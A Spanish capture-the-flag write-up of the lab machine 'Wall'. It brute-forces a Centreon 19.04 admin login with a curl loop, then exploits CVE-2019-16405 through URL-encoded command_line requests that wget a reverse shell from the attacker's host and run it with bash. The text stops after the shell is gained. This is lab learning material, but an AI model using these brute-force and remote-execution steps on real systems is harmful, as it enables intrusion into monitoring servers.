# Wall

![1_XItXYcP8tLhBnR8FvyPing](https://user-images.githubusercontent.com/87484792/184016462-429034df-66b4-4f34-8386-107417732885.png)

## Datos de Interés

Siento que esta máquina no tiene un gran nivel de dificultad. Será cuestión de investigar un poco sobre el servicio de monitorización que hostea el puerto 80 en el servidor Web. En este caso se trata de **Centreón**. La escalada de privilegios se hará a traves de un SUID que ya hemos podido explotar en otras maquinas, será el screen con versión 4.5.0. Explicaremos de forma manual algunos scripts para entender la intrusión.

## Enumeración

Empezaremos con la fase de enumeración, usaremos nmap para descubrir puertos abiertos. 

`sudo nmap --min-rate 5000 -vvv -p- -sS -Pn -n -oN openPorts.txt 10.10.10.157`

Esta maquina solamente tiene dos puertos abiertos.

![image](https://user-images.githubusercontent.com/87484792/184020390-8073e636-5782-434b-8c9e-d632cec64022.png)

Por un lado tendremos puerto 22 (SSH) y por otro lado el puerto 80 (HTTP).

##  Reconocimiento 

Con SSH no podemos hacer gran cosa ahora mismo, no tenemos credenciales válidas. Iremos a revisar el otro puerto. Encontramos una pagina web con un "Default Page" de Apache. 

![image](https://user-images.githubusercontent.com/87484792/184023616-68fb0323-61b8-4928-863c-4e1f63d08612.png)

Es buena idea empezar a hacer fuzzing, tiraré de dirsearch, en caso de no encontrar nada usaré otro diccionario o haré uso de wFUZZ. Aunque ya puedo adelantar que con dirsearch me fue suficiente.

![image](https://user-images.githubusercontent.com/87484792/184025529-e16886f4-9fc6-4d8c-9cae-5fb7eb29bdd9.png)

Hay cosas interesantes en el reporte del fuzz. 
- */panel.php* parece ser una pequeña troleada del author de la caja.
- */Monitoring*, no podemos acceder. Necesitamos credenciales.
- */centreon* es un software de monitoreo. No tenemos credenciales pero si que tenemos algo muy importante, **la versión**.

![image](https://user-images.githubusercontent.com/87484792/184026472-c0a47dbd-145d-4564-800e-1f39c039f513.png)

La misma web nos da la información que estamos contra un login de versión 19.04

Esto es muy bueno ya que haciendo una busqueda simple en Google, vemos varios CVE y podemos ver que es vulnerable a **RCE**.
Para poder ejecutar estos CVE necesitamos acceso a una cuenta administrador, pero puesto que no tengo ninguno, intentaré bruteforcearlo.

Encontré un script que me ahorraba tiempo para el bruteforce, pero al echarle un ojo quise aprender como funcionaba. Hay un token que nos limita el bruteforce, así que decidi mirar un poco más a fondo. Encontré que este sistema tiene una api que de primera me decia **Unauthorized**. Con una busqueda en google de la API, en la sección de Authenticación pude ver la data que espera la API. Por esta via será mucho más rápido y eficiente que intentar manipular la petición con el token.

Monté un oneliner como este:

`while read line; do request=$(curl -s -X POST "http://10.10.10.157/centreon/api/index.php?action=authenticate" -d "username=admin&password=$line" | tr -d "\""); if [ $request != "Bad credentials" ];then echo -e "\n"'[*] Password found: '$line; break; fi ; done < /usr/share/wordlists/rockyou.txt`

Funciono. Conseguí la password: `password1`

Y efectivamente era la correcta. 
Tal como se puede mostrar en la imagen, nos ha dejado loguearnos.

![image](https://user-images.githubusercontent.com/87484792/184038497-785183bd-a2e8-4d03-b853-7d061616b1fb.png)

Mirando los POC de los CVE, intenté hacerlo de forma manual. De forma grafica tendremos que acceder a **"Config > Commands > Discovery"**
Sin embargo parece que no funciona, algo esta bloqueando el poder ejecutar comandos. Dudo que siendo admin no tengamos los privilegios suficientes para ejecutar comandos.

![image](https://user-images.githubusercontent.com/87484792/184151052-528764c9-7215-4afa-82df-e14288fbda6f.png)

Me pregunté si habia algún WAF activo. Probé tambien con Scripts que habia de la comunidad en GitHub y Scripts de db-exploit. Ninguno me daba una shell.
Como habia más de un CVE que afectaba a esta versión, decidi mirar los otros caminos posibles. 

## CVE-2019-16405

Podemos realizar Ejecución Remota de Comandos a traves de una modificación de plugin, siempre y cuando tengamos permisos de administrador.
Es el caso, así que probaré.

![image](https://user-images.githubusercontent.com/87484792/184155790-5802941d-d764-4ce8-9d33-05e921090fc9.png)

`URL: http://10.10.10.157/centreon/main.get.php?p=60801&command_hostaddress=&command_example=&command_line=id&o=p&min=1`

Y si, efectivamente podemos ejecutar comandos. Trataré de cargar una shell para ejecutarla con bash. Hay varios Scripts que son totalmente funcionales, y que dejaré en este write up, pero esta vez lo haremos de forma manual. 

De primeras, crearé un archivo llamado 'shell' con una reverse dentro, compartiré ese archivo a traves de un servidor Python y por último ejecutaré en el centreon el comando de *wget* para descargarlo en la maquina victima.  

![image](https://user-images.githubusercontent.com/87484792/184157502-36293fb2-ee1a-4d9f-9c34-5a1b7279e2c5.png)

`http://10.10.10.157/centreon/main.get.php?p=60801&command_hostaddress=&command_example=&command_line=wget%20http%3A%2F%2F10.10.16.7%2Fshell%20-O%20%2Ftmp%2Fshell&o=p&min=1`

Despues de este paso, queda activarlo para obtener la shell. Ejecutaremos bash.
Para eso antes, me pondré en escucha por el puerto 8081. Y finalmente, ejecutamos.

`http://10.10.10.157/centreon/main.get.php?p=60801&command_hostaddress=&command_example=&command_line=chmod%20777%20/tmp/shell&o=p&min=1`

`http://10.10.10.157/centreon/main.get.php?p=60801&command_hostaddress=&command_example=&command_line=bash%20%2Ftmp%2Fshell&o=p&min=1`

![image](https://user-images.githubusercontent.com/87484792/184161738-661c37ad-69d8-496f-b830-8d1b8edaacf6.png)


